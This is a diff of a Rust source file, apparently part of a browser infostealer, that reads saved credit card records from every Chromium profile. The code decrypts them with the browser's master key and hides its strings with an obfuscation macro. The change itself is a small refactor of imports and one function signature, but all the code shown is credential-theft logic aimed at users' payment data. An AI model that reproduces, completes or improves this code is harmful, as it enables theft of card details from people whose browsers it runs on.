@@ -1,5 +1,4 @@
 use alloc::boxed::Box;
-use sqlite::{TableRecord, TableRecordExtension};
 use crate::alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -8,6 +7,7 @@ use utils::path::Path;
 use crate::chromium::Browser;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
 use obfstr::obfstr as s;
+use database::TableRecord;
 use utils::browsers::chromium::decrypt_data;
 
 const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
@@ -53,7 +53,7 @@ fn read_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard
     )
 }
 
-fn extract_card_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<CreditCard> {
+fn extract_card_from_record(record: &dyn TableRecord, master_key: &[u8]) -> Option<CreditCard> {
     let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?.to_owned();
     let expiration_month = record.get_value(CREDIT_CARDS_EXPIRATION_MONTH)?.as_integer()?;
     let expiration_year = record.get_value(CREDIT_CARDS_EXPIRATION_YEAR)?.as_integer()?;
